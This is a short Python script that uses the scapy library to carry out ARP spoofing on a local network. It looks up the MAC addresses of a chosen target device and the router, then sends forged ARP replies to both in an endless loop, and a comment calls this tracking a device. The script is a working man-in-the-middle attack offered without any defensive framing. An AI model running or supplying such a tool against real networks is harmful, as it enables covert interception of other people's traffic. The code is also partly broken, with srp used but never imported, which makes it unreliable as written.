from scapy.all import ARP, Ether, sendp

def get_mac(ip):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered, _ = srp(arp_request_broadcast, timeout=1, verbose=False)
    return answered[0][1].hwsrc

target_ip = "192.168.1.X" # IP of the device you want to track
gateway_ip = "192.168.1.1" # IP of your router

target_mac = get_mac(target_ip)
gateway_mac = get_mac(gateway_ip)

def poison_target(target_ip, gateway_ip, target_mac, gateway_mac):
    poison_target = ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac)
    poison_gateway = ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac)

    sendp(poison_target, verbose=False)
    sendp(poison_gateway, verbose=False)

while True:
    poison_target(target_ip, gateway_ip, target_mac, gateway_mac)
